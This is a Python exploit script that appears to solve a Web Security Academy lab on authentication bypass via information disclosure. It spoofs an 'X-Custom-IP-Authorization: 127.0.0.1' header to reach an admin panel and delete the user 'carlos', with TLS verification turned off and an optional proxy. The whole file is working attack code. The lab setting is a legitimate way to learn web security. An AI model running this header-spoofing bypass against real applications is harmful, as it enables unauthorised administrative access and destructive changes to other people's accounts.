#!/usr/bin/env python3 

import requests
import urllib3
import argparse
from argparse import RawTextHelpFormatter

# Disable warnings related to certificates
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

parser = argparse.ArgumentParser(description="""Information Disclosure Web Security Academy

Example usage with proxy: python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "/admin/delete?username=carlos" -p 127.0.0.1:8080

Example usage without proxy: python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "/admin/delete?username=carlos"

Authentication bypass via information disclosure solution: /admin/delete?username=carlos (+ X-Custom-IP-Authorization header)
""", usage='use "python3 %(prog)s --help" for more information', formatter_class=RawTextHelpFormatter)
parser.add_argument('-u', '--url', help='URL, Example: https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net', required=True)
parser.add_argument('-c', '--command', help='Command to run, Example: /admin/delete?username=carlos', required=True)
parser.add_argument('-p', '--proxy', help='Proxy, Example: 127.0.0.1:8080', required=False)
args = parser.parse_args()

if args.url.endswith("/"):
    url = args.url[:-1]
else: 
    url = args.url
command = args.command

def auth_bypass(url, command):
    if args.proxy:
        args.proxy=str(args.proxy)
        proxies = {
            'http': 'http://' + args.proxy,
            'https': 'http://' + args.proxy,
        }
        requests.get(url + command, verify=False, proxies=proxies, headers={"X-Custom-IP-Authorization":"127.0.0.1"})
    else:
        requests.get(url + command, verify=False, headers={"X-Custom-IP-Authorization":"127.0.0.1"})
    admin_url = url + '/admin'
    r = requests.get(admin_url, verify=False, headers={"X-Custom-IP-Authorization":"127.0.0.1"})
    if (b'carlos' not in r.content):
        print("(+) Carlos user is deleted")
        print("(+) Authentication Bypass Successful")
    else:
        print("(-) Authentication Bypass Failed")

def main():
    
    print("(+) Athentication Bypass")
        
    auth_bypass(url, command)

if __name__ == "__main__":
    main()
